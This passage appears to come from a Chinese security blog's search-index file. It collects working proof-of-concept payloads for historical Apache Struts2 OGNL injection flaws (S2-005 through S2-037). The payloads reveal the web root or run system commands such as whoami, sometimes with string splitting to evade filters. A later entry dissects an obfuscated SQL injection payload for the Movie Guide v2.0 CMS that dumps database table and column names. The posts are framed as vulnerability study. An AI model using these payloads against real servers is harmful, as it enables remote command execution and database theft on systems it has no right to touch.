java.lang.ProcessBuilder(\"whoami\")).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),##matt.getWriter().println(new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-005","title":"Struts2 S2-005","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.1.8.1\n\u6f0f\u6d1e\u8be6\u60c5: http://struts.apache.org/docs/s2-005.html\n</code></pre> <p>struts2\u6f0f\u6d1e\u7684\u8d77\u6e90\u6e90\u4e8eS2-003(\u53d7\u5f71\u54cd\u7248\u672c: \u4f4e\u4e8eStruts 2.0.12)\uff0cstruts2\u4f1a\u5c06http\u7684\u6bcf\u4e2a\u53c2\u6570\u540d\u89e3\u6790\u4e3aongl\u8bed\u53e5\u6267\u884c(\u53ef\u7406\u89e3\u4e3ajava\u4ee3\u7801)\u3002ongl\u8868\u8fbe\u5f0f\u901a\u8fc7##\u6765\u8bbf\u95eestruts\u7684\u5bf9\u8c61\uff0cstruts\u6846\u67b6\u901a\u8fc7\u8fc7\u6ee4##\u5b57\u7b26\u9632\u6b62\u5b89\u5168\u95ee\u9898\uff0c\u7136\u800c\u901a\u8fc7unicode\u7f16\u7801(\\u0023)\u62168\u8fdb\u5236(\\43)\u5373\u7ed5\u8fc7\u4e86\u5b89\u5168\u9650\u5236\uff0c\u5bf9\u4e8eS2-003\u6f0f\u6d1e\uff0c\u5b98\u65b9\u901a\u8fc7\u589e\u52a0\u5b89\u5168\u914d\u7f6e(\u7981\u6b62\u9759\u6001\u65b9\u6cd5\u8c03\u7528\u548c\u7c7b\u65b9\u6cd5\u6267\u884c\u7b49)\u6765\u4fee\u8865\uff0c\u4f46\u662f\u5b89\u5168\u914d\u7f6e\u88ab\u7ed5\u8fc7\u518d\u6b21\u5bfc\u81f4\u4e86\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528OGNL\u8868\u8fbe\u5f0f\u8bb2\u8fd92\u4e2a\u9009\u9879\u6253\u5f00\uff0cS2-003\u7684\u4fee\u8865\u65b9\u6848\u628a\u81ea\u5df1\u4e0a\u4e86\u4e00\u4e2a\u9501\uff0c\u4f46\u662f\u628a\u9501\u94a5\u5319\u7ed9\u63d2\u5728\u4e86\u9501\u5934\u4e0a</p> <p>\u4e0a\u6587\u5f15\u7528LittleHann\u7684\u63cf\u8ff0</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_1","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_1","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>('\\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&amp;('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&amp;(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(i97)(('\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))')(d))&amp;(i99)(('\\43xman.getWriter().close()')(d))\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_3","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>('\\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&amp;('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\\43mycmd\\75\\'\"+cmd+\"\\'')(d))&amp;(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&amp;(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&amp;(j)(('\\43myres\\75new\\40byte[51020]')(d))&amp;(k)(('\\43mydat.readFully(\\43myres)')(d))&amp;(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&amp;(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(n)(('\\43myout.getWriter().println(\\43mystr)')(d))\n</code></pre> <p>\u4e0a\u97622\u4e2aPoC\u6458\u81eak8team\uff0c\u4e3a\u4e86\u5199PoC\uff0c\u6709\u6240\u6539\u52a8\uff0c\u4f46\u662f\u8fd9\u91cc\u5c31\u4e0d\u8d34\u4e0a\u6765\u4e86\uff1a\uff09</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-009","title":"Struts2 S2-009","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.3.1.1\n\u6f0f\u6d1e\u8be6\u60c5: https://struts.apache.org/docs/s2-009.html\n</code></pre> <p>\u6f0f\u6d1e\u5229\u7528\u70b9\u8ddfS2-003\u548cS2-005\u7c7b\u4f3c\uff0c\u5229\u7528OGNL\u8868\u8fbe\u5f0f(1)(2),\u4f1a\u6267\u884c1\u7684OGNL\u8868\u8fbe\u5f0f\uff0c009\u6784\u9020\u4e86\u7684\u65b9\u6cd5\u4e3atest=(some OGNL \u8868\u8fbe\u5f0f)(1)&amp;z[(test)(1)]=true\u3002 z[(test)(1)]=true,\u5bf9struts2\u6765\u8bf4\u662f\u5408\u6cd5\u7684\u53c2\u6570\uff0c\u4f46\u662f(test)(1)\u4f1a\u6267\u884c\u4e0a\u8ff0\u8bf4\u7684\u65b9\u6cd5\uff0ctest\u7684\u503c\u88ab\u5e26\u5165\u8ba1\u7b97\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_2","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_4","title":"## \u5f39\u8ba1\u7b97\u5668","text":"<p>ps:\u5b9e\u9a8c\u73af\u5883\u8bd5\u4e86\u597d\u51e0\u6b21\u90fd\u4e0d\u80fd\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u8def\u8fc7\u7684\u5927\u4f6c\u6c42\u6307\u6559\uff1a\uff09</p> <p><pre><code>person.name=(##context[\"xwork.MethodAccessor.denyMethodExecution\"]= new java.lang.Boolean(false), ##_memberAccess[\"allowStaticMethodAccess\"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app'))(meh)&amp;z[(person.name)('meh')]=true\n</code></pre> \u7528\u7684\u662f<code>person/new-person.action</code>\u8fd9\u4e2a\u63a7\u5236\u5668</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_2","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D\"\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-012","title":"Struts2 S2-012","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.3.13\n\u6f0f\u6d1e\u8be6\u60c5: https://cwiki.apache.org/confluence/display/WW/S2-012\n</code></pre> <p>Action \u4e2d Result \u65f6\u4f7f\u7528\u4e86\u91cd\u5b9a\u5411\u7c7b\u578b\uff0c\u5e76\u4e14\u8fd8\u4f7f\u7528 ${param_name} \u4f5c\u4e3a\u91cd\u5b9a\u5411\u53d8\u91cf,struts\u5728\u83b7\u53d6\u5176\u503c\u65f6\u4f1a\u6267\u884cOGNL\u8868\u8fbe\u5f0f\uff0c\u4ece\u800c\u9020\u6210\u547d\u4ee4\u6267\u884c</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_3","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_3","title":"## \u83b7\u53d6web\u6839\u8def\u5f84","text":"<pre><code>%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_5","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-013s2-014","title":"Struts2 S2-013/S2-014","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.3.14.1\n\u6f0f\u6d1e\u8be6\u60c5: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014\n</code></pre> <p>\u6807\u7b7e<code>s:url</code>\u548c<code>s:a</code>\u4e2d\u63d0\u4f9binclude\u53c2\u6570\uff0c\u5176\u53c2\u6570\u503c\u53ef\u4ee5\u4e3a</p> <ol> <li>none - include no parameters in the URL (default)</li> <li>get - include only GET parameters in the URL</li> <li>all - include both GET and POST parameters in the URL</li> </ol> <p>\u5982\u679c\u53c2\u6570\u503c\u4e3aget\u6216all\uff0c\u5728\u83b7\u53d6\u5bf9\u5e94\u7684\u53c2\u6570\u503c\u65f6\u6267\u884c\u4e86OGNL\u8868\u8fbe\u5f0f</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_4","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_4","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>a=${(%23_memberAccess[\"allowStaticMethodAccess\"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('webpath%3a'%2b%23req.getRealPath(\"/\")),%23out.close())}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_6","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>a=${(%23_memberAccess[\"allowStaticMethodAccess\"]=true,%23a=@java.lang.Runtime@getRuntime().exec('\"+cmd+\"').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('dbapp%3a'%2bnew java.lang.String(%23d)),%23out.close())}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-016","title":"Struts2 S2-016","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.3.15\n\u6f0f\u6d1e\u8be6\u60c5: https://struts.apache.org/docs/s2-016.html\n</code></pre> <p>\u200b    </p> <p>DefaultActionMapper \u7c7b\u652f\u6301\u4ee5 action:\uff0credirect: \u548c redirectAction: \u4f5c\u4e3a\u8bbf\u95ee\u524d\u7f00\uff0c\u524d\u7f00\u540e\u9762\u53ef\u4ee5\u8ddf OGNL \u8868\u8fbe\u5f0f\uff0c\u7531\u4e8e Struts2 \u672a\u5bf9\u5176\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u4efb\u610f Action \u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u524d\u7f00\u6267\u884c\u4efb\u610f OGNL \u8868\u8fbe\u5f0f\uff0c\u4ece\u800c\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c</p> <p>\u4e0a\u6587\u5f15\u7528rickgray\u7684\u63cf\u8ff0\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_5","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_5","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>?redirect:${##req=##context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),##resp=##context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),##resp.setCharacterEncoding('UTF-8'),##ot=##resp.getWriter (),##ot.print('web'),##ot.print('path:'),##ot.print(##req.getSession().getServletContext().getRealPath('/')),##ot.flush(),##ot.close()}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_7","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>?redirect:${##a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get('co'+'m.ope'+'nsymph'+'ony.x'+'wor'+'k2.disp'+'atch'+'er.HttpSe'+'rvletRe'+'sponse'),##matt.getWriter().println(new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()}'\n</code></pre> <p>\u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9690\u853d\u7684\u65b9\u6cd5\uff0c\u5c06PoC\u653e\u5728\u6587\u4ef6\u4e0a\u4f20\u7684name\u5904\uff0c\u8fc7waf\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-019","title":"Struts2 S2-019","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.0.0 - 2.3.15.1\n\u6f0f\u6d1e\u8be6\u60c5: https://cwiki.apache.org/confluence/display/WW/S2-019\n</code></pre> <p>\u8be5\u6f0f\u6d1e\u6210\u56e0\u4e3a\u5f00\u542f\u4e86\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u4f20\u5165<code>debug=command&amp;expression=</code>\u5bfc\u81f4\u6267\u884cOGNL\u8868\u8fbe\u5f0f\uff0c\u4ece\u800c\u9020\u6210\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_6","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_6","title":"## \u83b7\u53d6web\u6839\u8def\u5f84","text":"<pre><code>debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_8","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-032","title":"Struts2 S2-032","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)\n\u6f0f\u6d1e\u8be6\u60c5: https://struts.apache.org/docs/s2-032.html\n</code></pre> <p>\u5728\u914d\u7f6e\u4e86 Struts2 DMI \u4e3a True \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528 method: Action \u524d\u7f00\u53bb\u8c03\u7528\u58f0\u660e\u4e3a public \u7684\u51fd\u6570\uff0cDMI \u7684\u76f8\u5173\u4f7f\u7528\u65b9\u6cd5\u53ef\u53c2\u8003\u5b98\u65b9\u4ecb\u7ecd\uff08Dynamic Method Invocation\uff09\uff0c\u8fd9\u4e2a DMI \u7684\u8c03\u7528\u7279\u6027\u5176\u5b9e\u4e00\u76f4\u5b58\u5728\uff0c\u53ea\u4e0d\u8fc7\u5728\u4f4e\u7248\u672c\u4e2d Strtus2 \u4e0d\u4f1a\u5bf9 name \u65b9\u6cd5\u503c\u505a OGNL \u8ba1\u7b97\uff0c\u800c\u5728\u9ad8\u7248\u672c\u4e2d\u4f1a\uff0c\u4ee3\u7801\u8be6\u60c5\u53ef\u53c2\u8003\u963f\u5c14\u6cd5\u5b9e\u9a8c\u5ba4\u7684\u62a5\u544a - \u300aApache Struts2 s2-032\u6280\u672f\u5206\u6790\u53ca\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c\u300b <p>\u4e0a\u6587\u5f15\u7528rickgray\u7684\u63cf\u8ff0\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_7","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_7","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>?method:##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,##req=##context.get(##parameters.a[0]),##resp=##context.get(##parameters.b[0]),##resp.setCharacterEncoding(##parameters.c[0]),##ot=##resp.getWriter (),##ot.print(##parameters.e[0]+##req.getSession().getServletContext().getRealPath(##parameters.d[0])),##ot.flush(),##ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_9","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>?method:##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,##a=(new java.lang.ProcessBuilder(##parameters.a[0])).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get(##parameters.b[0]),##matt.getWriter().println(##parameters.c[0]+new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-037","title":"Struts2 S2-037","text":"<pre><code>\u5f71\u54cd\u7248\u672c: 2.3.20 - 2.3.28.1\n\u6f0f\u6d1e\u8be6\u60c5: http://struts.apache.org/docs/s2-037.html\n</code></pre> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u548c\u4e4b\u524dS2-032/033\u662f\u4e00\u4e2a\u5730\u65b9\uff0c\u90fd\u662f\u5728DefaultActionInvocation.java\u7684invokeAction\u65b9\u6cd5\u4e2d\u6ca1\u6709\u5bf9\u4e8emethodName\u53c2\u6570\u5185\u5bb9\u8fdb\u884c\u6821\u9a8c\uff0c\u4fbf\u76f4\u63a5\u4e22\u5230\u4e86getValue\u65b9\u6cd5\u91cc\u9762\uff0c\u4ece\u800c\u9020\u6210Ongl\u8868\u8fbe\u5f0f\u7684\u6ce8\u5165\u3002</p> <p>\u4e0a\u6587\u5f15\u7528nsfocus\u7684\u63cf\u8ff0</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc_8","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web_8","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>/(##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(##req=##context.get(##parameters.a[0]),##resp=##context.get(##parameters.b[0]),##resp.setCharacterEncoding(##parameters.c[0]),##ot=##resp.getWriter (),##ot.print(##parameters.e[0]+##req.getSession().getServletContext().getRealPath(##parameters.d[0])),##ot.flush(),##ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_10","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>/(##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(##a=(new java.lang.ProcessBuilder(##parameters.a[0])).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get(##parameters.b[0]),##matt.getWriter().println(##parameters.c[0]+new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_11","title":"\u603b\u7ed3","text":"<p>Struts2\u547d\u4ee4\u6267\u884c\u7b97\u662f\u4e00\u4e2a\u6bd4\u8f83\u7ecf\u5178\u7684\u6f0f\u6d1e\u4e86\uff0c\u5e0c\u671b\u4ee5\u540e\u6df1\u5165java\u7684\u4e00\u4e9b\u6846\u67b6\uff0c\u53ef\u4ee5\u4ece\u5e95\u5c42\u6765\u5206\u6790\uff1a\uff09</p>","tags":["Java"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/","title":"MovieGuide v2.0 SQLi","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x00","title":"0x00","text":"<p>Detail: Movie Guide v2.0 SQL Injection</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x01","title":"0x01","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7c97\u7cd9\u7684\u5f00\u6e90cms\uff0c\u603b\u4f53\u6765\u8bf4\u5e76\u6ca1\u6709\u5bf9\u8f93\u5165\u8f93\u51fa\u505a\u5b89\u5168\u5904\u7406\uff0c\u4ecePoC\u5165\u624b\uff0c\u9009\u4e00\u4e2a\u8fd8\u539f\u4e00\u4e0b\u6f0f\u6d1e\u5f62\u6210\u8fc7\u7a0b\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/#pocindexphpmdsql","title":"PoC\uff1aindex.php?md=[SQL]","text":"<p>\u5b9a\u4f4d\u4e00\u4e0bmd\u53c2\u6570 layout.php\u4e3a\u8be5cms\u7684\u4e3b\u8981\u5165\u53e3\u5904\u7406,\u4e0b\u8ff0\u7684\u53d8\u91cf\u5747\u6ca1\u6709\u901a\u8fc7\u5b89\u5168\u5904\u7406\uff0c\u76f4\u63a5SQL\u8bed\u53e5\uff0c\u4ece\u800c\u90fd\u53ef\u4ee5\u7528\u4e8e\u6570\u636e\u5e93\u6ce8\u5165\u3002 <pre><code>//Get the passed variables.\n$mterm = filter_input(INPUT_POST, 'tterm');\n$cterm = filter_input(INPUT_POST, 'gterm');\n$lterm = filter_input(INPUT_GET, 'gterm');\n$yterm = filter_input(INPUT_GET, 'year');\n$md = filter_input(INPUT_GET, 'md');\n$actorname = filter_input(INPUT_GET, 'actor');\n$directorname = filter_input(INPUT_GET, 'director');\n</code></pre> \u76f4\u63a5\u62fc\u63a5\u5165SQL\u8bed\u53e5 <pre><code>$sql = \"SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE '\" . $md . \"' ORDER BY `Movie_Title` ASC Limit $start, $perpage\";\n</code></pre> \u8fd9\u91cc\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\u5b83\u7684PoC\uff0c\u4ee5\u524d\u6ca1\u6709\u89c1\u8fc7\u7c7b\u4f3c\u7684:b\uff0cPoC\u4e2d\u4f7f\u7528\u4e86export_set\u51fd\u6570</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/#export_setbitsonoffseparatornumber_of_bits","title":"<code>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])</code>","text":"<p><code>Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of \u22121 is effectively the same as 64.</code></p> <p>\u5206\u89e3\u4e00\u4e0bPoC <pre><code>/*!02222UNION*/\n(\n    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,\n        (\n            /*!02222Select*/\n                export_set(5,@a:=0,\n                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a\n                    export_set(5,\n                        export_set(5,@a,/*!02222table_name*/,'&lt;li&gt;',2)//dump table_name [0&lt;li&gt;table_name]\n                    ,/*!02222column_name*/,'\\n:',2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name]\n                )\n            ,@a,2)//set @a split char\n        )\n    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239\n    )-- -\n</code></pre></p> <p>\u8fd9\u91cc\u4e3b\u8981\u5229\u7528\u7684\u662fexport_set\u51fd\u6570\u7684no\uff0coff\u4f4d\u7f6e\u6765dump\u6570\u636e\u3002</p> <ul> <li>\u9996\u5148\u901a\u8fc7@a:=0\uff0c\u5b9a\u4e49\u53d8\u91cfa\u4e3a0\uff08\u53ef\u80fd\u8ddfmysql\u7248\u672c\u6709\u5173\u7cfb\uff0c5.7.x\u4e0b\u7684mysql\u65e0\u6cd5\u7528@:=0\u6765\u5b9a\u4e49\uff09</li> <li>\u6700\u91cc\u9762\u7684export_set\uff0c\u5c06table_name dump\u51fa\u6765\uff08\u7ed3\u679c\u4e3a<code>0&lt;li&gt;table_name</code>\uff09</li> <li>\u63a5\u4e0b\u6765\u7684\u4e00\u4e2aexport_set\uff0c\u5c06columns_name dump\u51fa\u6765(\u7ed3\u679c\u4e3a<code>0&lt;li&gt;table_name\\n:columns_name</code>)</li> <li><code>select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,'&lt;li&gt;',2),column_name,'\\n:',2)</code>\u5c06\u4e0a\u8ff0\u7684\u6570\u636e\u8d4b\u503c\u7ed9\u53d8\u91cfa</li> <li>\u6700\u540e\u7528\u6700\u540e\u4e00\u4e2aexport_set\uff0c\u7528@a\u505a\u5206\u9694\u7b26\uff0c\u5c06\u6570\u636edump\u51fa\u6765</li> </ul>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x02","title":"0x02 \u603b\u7ed3","text":"<p>\u8be5cms\u7684\u6ce8\u5165\u6f0f\u6d1e\u5f88\u5e38\u89c4\uff0c\u4e3b\u8981\u662f\u5b66\u4e60\u5206\u6790\u4e86\u8be5PoC\uff0c\u80fd\u5728\u672a\u6765\u6ce8\u5165\u7ed5\u8fc7\u7684\u5730\u65b9\u5e94\u7528\u3002 1. 